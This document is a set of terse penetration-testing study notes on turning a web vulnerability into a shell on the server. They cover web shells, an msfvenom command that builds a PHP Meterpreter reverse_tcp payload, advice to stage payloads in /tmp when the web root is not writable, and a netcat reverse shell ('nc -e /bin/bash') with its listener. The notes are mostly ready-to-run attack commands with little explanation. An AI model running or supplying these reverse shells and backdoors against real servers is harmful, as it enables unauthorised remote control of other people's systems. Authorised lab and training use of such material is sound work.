Web To shell on Server : 

How to exploit a web vulnerability and to get a shell on the server 

# Web Shells : 

  - Upload Backdoor on the server 
  - execute commands on the server 

  Now we have various ways by which we can able to get a shell 
	- Commmand Injection 
	- File Upload 
	....

 Some web shells are present on kali machine : 
	/usr/share/webshells 

What is a Web Shell : 
	It is a Specialized Program which you can use as a backdoor to execute commands  and do other things 
	on the compromised server. 


# Web shell to php meterpreter: 

Web Shells : PHP Meterpreter 

Create PHP Meterpreter 
-> msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > php-meter.php
-> remove the comment out character from the php-meter.php from the starting of the file. 

Now the constraint is that we don't have permission to write on root directory 
  
During test we have seen that the www-data is not writable so instead of writing to the "/" directory we will
paste our file in "/temp" 

To run .php file run : php -f /tmp/php-meter.php

The temp directory is always writable so we can paste our shells or payload 


# Web Shell netcat Reverse Connect : 

Web Shell : Netcat Reverse Connects 

Scenario : 
  - No Write Access
  - Assume /tmp is also not accessible 
  - Rely on Utilities Installed on Systems 

Now on Kali side run : nc -l -p 10000
on the attacker side : nc -e /bin/bash [IP_Addr] [Port] 

# Web Shell Python php 

Web Shell: Using Python, PHP etc

Now the reason we use this is in the newer version the netcat is strip down so that the {-e flag} is removed
this means that your reverse connect shell will no longer work 

Now here we need to use 
	-Python 
   	-PHP
	-Bash
